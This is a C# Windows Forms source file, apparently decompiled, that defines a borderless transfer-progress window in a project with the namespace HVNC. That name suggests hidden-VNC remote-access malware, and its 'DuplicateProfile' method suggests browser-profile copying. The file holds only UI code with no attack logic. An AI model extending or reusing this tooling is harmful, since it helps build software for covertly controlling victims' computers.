using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	public class FrmTransfer : Form
	{
		public int int_0;

		private IContainer components;

		private ProgressBar DuplicateProgess;

		private Label FileTransferLabel;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2ShadowForm guna2ShadowForm1;

		private Label PingTransform;

		public ProgressBar DuplicateProgesse
		{
			get
			{
				return DuplicateProgess;
			}
			set
			{
				DuplicateProgess = value;
			}
		}

		public Label FileTransferLabele
		{
			get
			{
				return FileTransferLabel;
			}
			set
			{
				FileTransferLabel = value;
			}
		}

		public Label PingTransfor
		{
			get
			{
				return PingTransform;
			}
			set
			{
				PingTransform = value;
			}
		}

		public FrmTransfer()
		{
			int_0 = 0;
			InitializeComponent();
		}

		private void FrmTransfer_Load(object sender, EventArgs e)
		{
		}

		public void DuplicateProfile(int int_1)
		{
			if (int_1 > int_0)
			{
				int_1 = int_0;
			}
			FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
			DuplicateProgess.Value = int_1;
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmTransfer));
			DuplicateProgess = new System.Windows.Forms.ProgressBar();
			FileTransferLabel = new System.Windows.Forms.Label();
			PingTransform = new System.Windows.Forms.Label();
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			SuspendLayout();
			DuplicateProgess.ForeColor = System.Drawing.Color.FromArgb(9, 248, 121);
			DuplicateProgess.Location = new System.Drawing.Point(12, 13);
			DuplicateProgess.Name = "DuplicateProgess";
			DuplicateProgess.Size = new System.Drawing.Size(453, 25);
			DuplicateProgess.TabIndex = 1;
			FileTransferLabel.AutoSize = true;
			FileTransferLabel.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			FileTransferLabel.Location = new System.Drawing.Point(225, 47);
			FileTransferLabel.Name = "FileTransferLabel";
			FileTransferLabel.Size = new System.Drawing.Size(40, 14);
			FileTransferLabel.TabIndex = 4;
			FileTransferLabel.Text = "Status";
			PingTransform.AutoSize = true;
			PingTransform.Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			PingTransform.Location = new System.Drawing.Point(255, 47);
			PingTransform.Name = "PingTransform";
			PingTransform.Size = new System.Drawing.Size(94, 14);
			PingTransform.TabIndex = 5;
			PingTransform.Text = "Ping: Measuring....";
			PingTransform.Visible = false;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(9, 248, 121);
			guna2ShadowForm1.TargetForm = this;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 14f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.Black;
			base.ClientSize = new System.Drawing.Size(475, 71);
			base.Controls.Add(FileTransferLabel);
			base.Controls.Add(DuplicateProgess);
			base.Controls.Add(PingTransform);
			DoubleBuffered = true;
			Font = new System.Drawing.Font("Electrolize", 8.249999f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmTransfer";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			base.ShowInTaskbar = false;
			base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
			base.Load += new System.EventHandler(FrmTransfer_Load);
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
